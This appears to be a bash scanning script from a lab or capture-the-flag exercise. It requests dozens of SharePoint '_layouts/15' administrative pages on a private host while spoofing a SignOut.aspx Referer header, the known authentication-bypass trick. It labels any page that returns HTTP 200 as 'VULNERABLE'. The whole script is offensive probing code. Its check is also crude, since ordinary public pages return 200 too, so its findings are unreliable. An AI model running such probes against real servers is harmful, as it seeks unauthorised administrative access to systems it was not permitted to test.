#!/bin/bash
# Extended list of SharePoint layout pages to test
endpoints=(
    "AppInv.aspx" "AreaNavigationSettings.aspx" "AreaTemplateSettings.aspx" 
    "AreaWelcomePage.aspx" "Authenticate.aspx" "ChangeSiteMasterPage.aspx"
    "Create.aspx" "CreateWebPage.aspx" "CustomizeDocIdSet.aspx"
    "DocIdSettings.aspx" "Download.aspx" "EditGrp.aspx"
    "EditPrms.aspx" "Group.aspx" "GuestError.aspx"
    "Help.aspx" "Images.aspx" "Info.aspx"
    "listedit.aspx" "ManageFeatures.aspx" "ManageContentType.aspx"
    "MngField.aspx" "MngGroup.aspx" "MngSiteContentTypes.aspx"
    "MngSubwebs.aspx" "ModifyLink.aspx" "MyInfo.aspx"
    "MySite.aspx" "navoptions.aspx" "NewDwp.aspx"
    "NewGrp.aspx" "NewList.aspx" "NewSiteCollectionWebPart.aspx"
    "opsitemng.aspx" "OSSSearchResults.aspx" "OwnershipConfirm.aspx"
    "Pagesettings.aspx" "perm.aspx" "Permission.aspx"
    "permsetup.aspx" "PickerDialog.aspx" "PolicyCtr.aspx"
    "PolicyList.aspx" "prjsetng.aspx" "Promote.aspx"
    "QuickLinks.aspx" "RecycleBin.aspx" "RedirectPage.aspx"
    "RegGhost.aspx" "RemoveUsers.aspx" "ReqAcc.aspx"
    "Role.aspx" "ScrLCID.aspx" "SiteManager.aspx"
    "SiteSettings.aspx" "SiteSubscriptionSettings.aspx" "SiteUsage.aspx"
    "SpcfGen.aspx" "SpellingSettings.aspx" "spcf.aspx"
    "SubNew.aspx" "ThemeWeb.aspx" "Themeweb.aspx"
    "TopNav.aspx" "Upload.aspx" "User.aspx"
    "UsrGroups.aspx" "Vroom.aspx" "WebDeleteConfirmation.aspx"
    "WebTemplateExtn.aspx" "WikiPageVersions.aspx" "WopiFrame.aspx"
    "WPPicker.aspx" "wrkmng.aspx"
)

echo "Testing $(echo ${#endpoints[@]}) additional endpoints..."
for endpoint in "${endpoints[@]}"; do
    url="http://10.10.10.166/_layouts/15/$endpoint"
    status=$(curl -s -o /dev/null -w "%{http_code}" -H "Referer: /_layouts/SignOut.aspx" "$url" --max-time 5)
    if [ "$status" = "200" ]; then
        echo "✓ VULNERABLE: $endpoint (Status: $status)"
    fi
done
